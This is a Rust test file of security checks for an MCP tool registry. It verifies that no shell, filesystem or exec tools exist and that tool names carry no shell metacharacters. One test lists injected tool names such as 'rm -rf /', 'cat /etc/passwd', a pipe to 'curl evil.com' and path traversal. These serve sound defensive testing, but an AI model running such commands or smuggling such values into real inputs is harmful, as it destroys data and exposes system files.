use crate::mcp::pane_state::FileEntry;
use crate::mcp::protocol::McpRequest;
use crate::mcp::tools::get_all_tools;

// =============================================================================
// Security-focused tests
// =============================================================================

#[test]
fn test_tool_names_no_shell_injection() {
    let tools = get_all_tools();
    let dangerous_chars = [
        '|', '&', ';', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '!', '\n', '\r',
    ];

    for tool in tools {
        for c in dangerous_chars {
            assert!(
                !tool.name.contains(c),
                "Tool name {} contains dangerous char: {}",
                tool.name,
                c
            );
        }
    }
}

#[test]
fn test_no_fs_tools_exist() {
    // Security: We removed fs.* tools to prevent file system access
    let tools = get_all_tools();
    let fs_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("fs.")).collect();
    assert!(
        fs_tools.is_empty(),
        "fs.* tools should not exist (security): {:?}",
        fs_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_shell_tools_exist() {
    // Security: We removed shell.* tools to prevent command execution
    let tools = get_all_tools();
    let shell_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("shell.")).collect();
    assert!(
        shell_tools.is_empty(),
        "shell.* tools should not exist (security): {:?}",
        shell_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_exec_tools_exist() {
    // Security: We should not have any exec/run tools
    let tools = get_all_tools();
    let dangerous_patterns = ["exec.", "run.", "execute.", "command.", "spawn.", "process."];

    for tool in tools {
        for pattern in dangerous_patterns {
            assert!(
                !tool.name.starts_with(pattern),
                "Dangerous tool pattern detected: {}",
                tool.name
            );
        }
    }
}

#[test]
fn test_tools_have_bounded_descriptions() {
    // Prevent DoS from overly long descriptions
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.description.len() <= 256,
            "Tool {} has description too long ({} chars)",
            tool.name,
            tool.description.len()
        );
    }
}

// =============================================================================
// Input injection tests
// =============================================================================

#[test]
fn test_malicious_tool_name_injection() {
    // These are tool names that an attacker might try
    let malicious_names = [
        "nav_up; rm -rf /",
        "nav_up && cat /etc/passwd",
        "nav_up | curl evil.com",
        "../../../etc/passwd",
        "nav_up\nrm -rf /",
        "nav_up\x00hidden",
    ];

    let tools = get_all_tools();
    for name in malicious_names {
        assert!(
            !tools.iter().any(|t| t.name == name),
            "Dangerous tool name should not exist: {}",
            name
        );
    }
}

#[test]
fn test_request_with_very_long_method() {
    // A request with an extremely long method name should still parse
    let long_method = "a".repeat(10000);
    let json = format!(r#"{{"jsonrpc": "2.0", "id": 1, "method": "{}"}}"#, long_method);

    let result: Result<McpRequest, _> = serde_json::from_str(&json);
    if let Ok(req) = result {
        // It parsed, but the method should not match any tool
        let tools = get_all_tools();
        assert!(!tools.iter().any(|t| t.name == req.method));
    }
}

#[test]
fn test_null_bytes_in_paths() {
    // Null bytes in paths could cause issues
    let entry = FileEntry {
        name: "file\x00hidden.txt".to_string(),
        path: "/path/file\x00hidden.txt".to_string(),
        is_directory: false,
        size: None,
        recursive_size: None,
        modified: None,
    };

    // Should serialize without panic
    let json = serde_json::to_value(&entry).unwrap();
    // The null byte is preserved in JSON
    assert!(json["name"].as_str().unwrap().contains('\x00'));
}
